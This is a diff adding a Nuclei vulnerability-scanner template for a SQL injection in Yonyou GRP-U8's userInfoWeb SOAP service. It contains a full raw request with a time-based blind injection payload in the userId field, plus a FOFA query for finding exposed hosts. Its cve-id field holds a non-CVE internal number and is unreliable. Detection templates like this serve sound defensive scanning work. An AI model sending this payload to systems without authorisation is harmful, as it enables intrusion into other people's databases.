@@ -1,0 +1,59 @@
+id: 2024-105091726
+
+info:
+  name: 用友GRP-U8内控管理软件services的userInfoWeb存在SQL注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |
+    用友政务公司获知用友GRP-U8高校内控管理软件存在SQL注入漏洞后，第一时间组织团队进行应急响应，分析处理漏洞问题并发布相关解决补丁，并对相关支持人员进行培训。本次漏洞主要是利用services/userInfoWeb下的getUserNameById，进行恶意SQL注入，获取非法信息，对服务及数据造成影响。存在一定的风险。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8-userInfoWeb%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+    - https://security.yonyou.com/#/noticeInfo?id=502
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105091726
+    cvss-score: 7.1
+    cwe-id: CWE-89
+  metadata:
+    date: 2024-02-22
+    version: 用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。
+    fofa-query: app="用友-GRP-U8"
+  tags: yonyou,sqli,1day,yonyounc,ncu8
+
+
+
+http:
+  - raw:
+      - |-
+        @timeout: 10s
+        POST /services/userInfoWeb HTTP/1.1
+        Cache-Control: max-age=0
+        Origin: null
+        DNT: 1
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        SOAPAction: 
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 565
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <ser:getUserNameById soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                <userId xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">';waitfor delay '0:0:3'--</userId>
+              </ser:getUserNameById>
+          </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "soapenv:Body")
+          - 'duration>=3'
+        condition: and
